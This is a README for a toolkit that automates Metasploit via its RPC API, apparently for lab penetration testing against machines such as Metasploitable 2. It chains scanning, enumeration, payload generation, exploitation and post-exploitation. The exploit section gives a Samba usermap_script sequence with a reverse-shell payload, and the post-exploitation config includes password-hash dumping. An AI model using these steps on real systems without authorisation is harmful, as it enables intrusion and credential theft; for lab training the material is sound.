# Metasploit RPC API — Automation

A hands-on toolkit that drives the Metasploit Framework programmatically
(through its RPC API and CLI tools) to automate a full workflow: finding open
ports on a target, enumerating its services, generating a payload and catching
the session, then running post-exploitation against it. Each tool does one job
and hands off to the next. Results are stored in a local database and browsed in
the terminal or a small web viewer.

## Overview

```
 SCAN ─▶ ENUMERATE ─▶ EXPLOIT ─▶ POST-EXPLOIT ─▶ VIEW
  │          │           │            │            │
 ports     read-only    payload +   gather info   terminal /
 into      auxiliaries  handler     + privesc     web viewer
 msf       into SQLite              into SQLite
```

| Stage | What it does | Tools |
|---|---|---|
| **Scan** | Fast port scan → nmap service detection → Metasploit workspace | `portscan.go`, `scan_import.py` |
| **Enumerate** | Run read-only auxiliary modules per service, store clean output | `enumerate.py`, `enum_modules.yaml`, `db.py` |
| **Exploit** | Interactive payload builder + matching handler | `payload_gen.py`, `handler.py` |
| **Post-exploit** | List sessions, run post modules per OS (info, hashes, privesc) | `post_exploit.py`, `post_modules.yaml` |
| **View** | Browse everything — ports, enum, post-exploitation | `view.py`, `app.py` |

**Data flow:**

```
portscan.go + scan_import.py      ─▶  msf workspace (ports + services)
enum_modules.yaml + enumerate.py  ─▶  enum_results.db (findings + services)
payload_gen.py ─▶ .last_payload.json ─▶ handler.py (catches a session)
post_modules.yaml + post_exploit.py ─▶ enum_results.db (post_findings)
view.py / app.py                  ─▶  read the database
```

---

## Prerequisites

| Tool | Check | Install (Kali / Debian) |
|---|---|---|
| Metasploit Framework | `msfconsole --version` | preinstalled on Kali |
| PostgreSQL | `sudo msfdb status` | preinstalled on Kali |
| Nmap | `nmap --version` | `sudo apt install nmap` |
| Go | `go version` | `sudo apt install golang-go` |
| Python 3 | `python3 --version` | preinstalled |

---

## Setup
### 1. Database
```bash
sudo msfdb init                              # first time only
sudo msfdb status
sudo systemctl start postgresql@18-main      # Kali's real instance is versioned
sudo systemctl enable postgresql@18-main
```

> `postgresql.service` on Kali is a wrapper (runs `/bin/true`), so
> `systemctl status postgresql` can say `active (exited)` while the DB is down.
> Always use `postgresql@18-main`. Find the exact name:
> `sudo systemctl list-units | grep -i postgres`

If an OS update causes a collation mismatch:
```bash
sudo -u postgres psql -d msf -c "ALTER DATABASE msf REFRESH COLLATION VERSION;"
```

### 2. Connection verification
```bash
msfconsole -q
```
```
msf > db_status
[*] Connected to msf. Connection type: postgresql.
```
If it shows `postgresql selected, no connection`:
```
msf > db_connect -y /usr/share/metasploit-framework/config/database.yml
```

### 3. Start the RPC server
```
msf > load msgrpc ServerHost=127.0.0.1 ServerPort=55552 User=msf Pass=<YOUR_PASSWORD> SSL=true
```
Verify it's listening (another terminal): `ss -tlnp | grep 55552`

The RPC server does **not** autostart — run `load msgrpc` in every new console,
or use the resource script below.

#### (Optional) Resource script for automatic load
```bash
cat > ~/.msf_rpc.rc <<'EOF'
db_connect -y /usr/share/metasploit-framework/config/database.yml
load msgrpc ServerHost=127.0.0.1 ServerPort=55552 User=msf Pass=<YOUR_PASSWORD> SSL=true
EOF
msfconsole -q -r ~/.msf_rpc.rc
```
Connecting the DB **before** loading msgrpc avoids the "Database Not Loaded"
error from the RPC server.

### 4. Python environment
```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

`.env` with your RPC credentials (kept out of git):
```bash
cat > .env <<'EOF'
MSF_RPC_HOST=127.0.0.1
MSF_RPC_PORT=55552
MSF_RPC_USER=msf
MSF_RPC_PASS=<YOUR_PASSWORD>
MSF_RPC_SSL=true
EOF
```

### 5. Build the Go scanner
```bash
go build -o portscan portscan.go
```

### 6. Smoke test
```bash
python3 smoke_test.py
```
If it prints the Metasploit version, the whole chain works: DB up, RPC
listening, credentials correct, library talking to the API.

---

## Quick Start Checklist

| # | Check | Command | Expected |
|---|-------|---------|----------|
| 1 | PostgreSQL up | `ss -tlnp \| grep 5432` | LISTEN on 5432 |
| 2 | DB connected | `db_status` (in console) | Connected (postgresql) |
| 3 | RPC listening | `ss -tlnp \| grep 55552` | LISTEN on 55552 |
| 4 | Python deps | `pip show pymetasploit3` | installed |
| 5 | Scanner built | `ls portscan` | binary exists |
| 6 | API reachable | `python3 smoke_test.py` | prints version |

---

## Metasploit Commands

**Database & Workspaces**
```
db_status                // whether the DB is connected
db_connect -y <path>     // connect to the DB from a YAML file
workspace                // list workspaces (current marked with *)
workspace <name>         // switch workspace
workspace -a <name>      // add a workspace
workspace -d <name>      // delete a workspace
hosts                    // list hosts in the workspace
services                 // list services (open ports)
creds                    // list collected credentials
loot                     // list collected loot (files, hashes)
```

**Modules**
```
search <term>            // search for modules
use <module>             // load a module
show options             // show the module's options
set <OPT> <value>        // set an option (this session)
setg <OPT> <value>       // set a GLOBAL option (all modules)
run  (or exploit)        // execute the loaded module
back                     // unload the current module
```

**Sessions**
```
sessions                 // list active sessions
sessions -i <id>         // interact with a session
sessions -u <id>         // upgrade a shell to meterpreter
sessions -k <id>         // kill a session
background               // send the current session to the background
```

**Plugins & RPC**
```
load msgrpc ServerHost=127.0.0.1 ServerPort=55552 User=msf Pass=<PW> SSL=true
unload <plugin>
```

---

## Scan
```bash
python3 -u scan_import.py <target>                 # ports 1-1024
python3 -u scan_import.py <target> --full          # all ports 1-65535
python3 -u scan_import.py <target> --name kioptrix # custom workspace name
```

Give it one target (IP or domain) and it runs end to end:

1. If the target is a domain, resolve it to an IP (workspace keeps the readable name).
2. **portscan.go** finds the OPEN ports fast (concurrent TCP, ~150 workers, retries).
3. **nmap -sV** deep-scans only those open ports → XML.
4. Create/reuse a workspace named after the target and switch into it.
5. Import the nmap XML into that workspace.
6. Set RHOSTS = target globally, so the next module already has the target.

Two tools because nmap on all 65535 ports is slow — the Go scanner finds the open
ports in seconds so nmap only deep-scans a handful. The temp XML is auto-deleted.

---

## Enumerate
```bash
python3 enumerate.py <workspace> --dry-run   # show what WOULD run, run nothing
python3 enumerate.py <workspace>             # run and store results
```

Runs **read-only** enumeration auxiliaries against each service and stores the
clean output in `enum_results.db`. No brute-force / `*_login` modules — those
need credentials and are attacks, not enumeration.

Matching is by **service name** (from `nmap -sV`), not port — so a web server on
8180 still enumerates as HTTP, and SMB on 139/445 runs once.

The service → modules map is `enum_modules.yaml` (data, not code):

```yaml
smb:
  no_rport: true          # SMB manages its own port, rejects RPORT
  modules:
    - scanner/smb/smb_version
    - scanner/smb/smb_enumshares
http:
  modules:
    - scanner/http/http_version
    - scanner/http/http_header
ssh:
  modules:
    - scanner/ssh/ssh_version
ftp:
  modules:
    - scanner/ftp/ftp_anonymous   # anonymous-login CHECK (enum, not brute)
```

Adding a service is usually just a YAML entry — `enumerate.py` matches nmap's
name to a key (aliases like `netbios-ssn → smb` live in `SERVICE_ALIASES`).
Re-running a workspace replaces its rows (clean current picture, no duplicates).

Inspect the DB directly:
```bash
python3 db.py                        # list workspaces + counts
sqlite3 enum_results.db "SELECT module, port FROM findings WHERE workspace='metasploitable2';"
```

---

## Exploit — Payload & Handler
```bash
python3 payload_gen.py        # interactive msfvenom wizard
python3 handler.py            # matching multi/handler for the last payload
python3 handler.py --show     # print settings/resource script, don't launch
```

```
payload_gen.py  ─▶  .last_payload.json  ─▶  handler.py
```

`payload_gen.py` walks platform → payload → LHOST (your LAN IP is suggested) →
LPORT → format → optional encoder → output file. Payloads are saved under
`payloads/` and the settings written to `.last_payload.json`. `handler.py` reads
that, builds the `multi/handler` and launches an interactive msfconsole; the
session opens there when the payload connects.

Match the payload **arch** to the target — Metasploitable 2 is 32-bit, so use x86.

On old targets, exploit modules are more reliable than custom payloads. Samba
gives a clean root shell (set the port or it targets the wrong one):
```
use exploit/multi/samba/usermap_script
set RHOSTS <target>
set RPORT 139
set payload cmd/unix/reverse
run
```

---

## Post-Exploitation
The post-access twin of the enumeration stage: same config-driven pattern, keyed
on the session's **OS** instead of a service, run against an open session.

```bash
python3 post_exploit.py                   # list open sessions, then exit
python3 post_exploit.py -s <id>           # run OS-matched post modules
python3 post_exploit.py -s <id> --dry-run # show what WOULD run
python3 post_exploit.py -s <id> -w <name> # tag results with a workspace
```

It lists sessions, detects the session OS, runs that OS's modules **plus** the
`multi` ones, cleans the output (drops console noise, progress spam, and the
target's login banner), and stores each result in the `post_findings` table.
Re-running replaces that session's rows.

Most post modules need a **meterpreter** session — upgrade a shell first with
`sessions -u <id>` in the console. The RPC API only sees sessions in the same msf
instance that `msgrpc` is loaded in.

The OS → modules map is `post_modules.yaml`:

```yaml
linux:
  - post/linux/gather/enum_system
  - post/linux/gather/enum_configs
  - post/linux/gather/hashdump
multi:
  - post/multi/gather/env
  - post/multi/recon/local_exploit_suggester   # privesc audit
```

`multi` modules run regardless of OS. `local_exploit_suggester` checks the
session against known local exploits — an automated privesc audit, most useful
when you're not already root.

---

## Viewing results
Two read-only viewers read `enum_results.db` (neither touches msf):

```bash
python3 view.py <workspace>   # terminal: colored ports table + module output
python3 app.py                # web viewer at http://127.0.0.1:5000
```

The web viewer (dark terminal theme) shows a target list, a stats line, an Open
Ports table, enum findings and post-exploitation as expandable cards badged
found/failed/ok, plus a live search filter. Service badges are colored
automatically from the service name.

---